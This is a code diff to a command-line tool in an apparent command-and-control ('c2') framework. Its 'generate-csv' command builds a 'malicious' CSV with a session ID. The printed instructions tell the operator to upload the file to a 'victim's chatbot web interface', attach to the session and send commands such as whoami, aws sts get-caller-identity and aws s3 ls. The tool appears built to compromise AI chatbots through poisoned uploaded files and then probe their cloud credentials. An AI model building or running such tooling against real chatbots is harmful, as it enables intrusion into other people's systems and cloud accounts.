@@ -1,9 +1,13 @@
 """Generate command for creating malicious payloads."""
 
+from pathlib import Path
+
 import click
 
 from c2.core.config import get_config
 from c2.core.payload_generator import generate_malicious_csv, generate_session_id
+
+SESSION_ID_FILE = ".session_id"
 
 
 @click.command("generate-csv")
@@ -64,6 +68,9 @@ def generate_csv(session, output, style, rows, quiet):
         num_rows=rows,
     )
 
+    # Save session ID to file for easy access
+    Path(SESSION_ID_FILE).write_text(info["session_id"])
+
     if quiet:
         click.echo(info["session_id"])
     else:
@@ -79,9 +86,13 @@ def generate_csv(session, output, style, rows, quiet):
         click.echo(f"\n  1. Upload CSV to victim's chatbot web interface:")
         click.echo(f"     {info['output_path']}")
         click.echo(f"\n  2. Attach to the session:")
-        click.echo(f"     c2 attach {info['session_id']}")
+        click.echo(f"     make attach")
+        click.echo(f"     # or: c2 attach {info['session_id']}")
         click.echo(f"\n  3. Send commands:")
         click.echo("     whoami")
         click.echo("     aws sts get-caller-identity")
         click.echo("     aws s3 ls")
-        click.echo(f"\n{'=' * 60}\n")
+        click.echo(f"\n{'=' * 60}")
+        click.echo(f"  Session ID saved to: {SESSION_ID_FILE}")
+        click.echo(f"  Session ID: {info['session_id']}")
+        click.echo(f"{'=' * 60}\n")
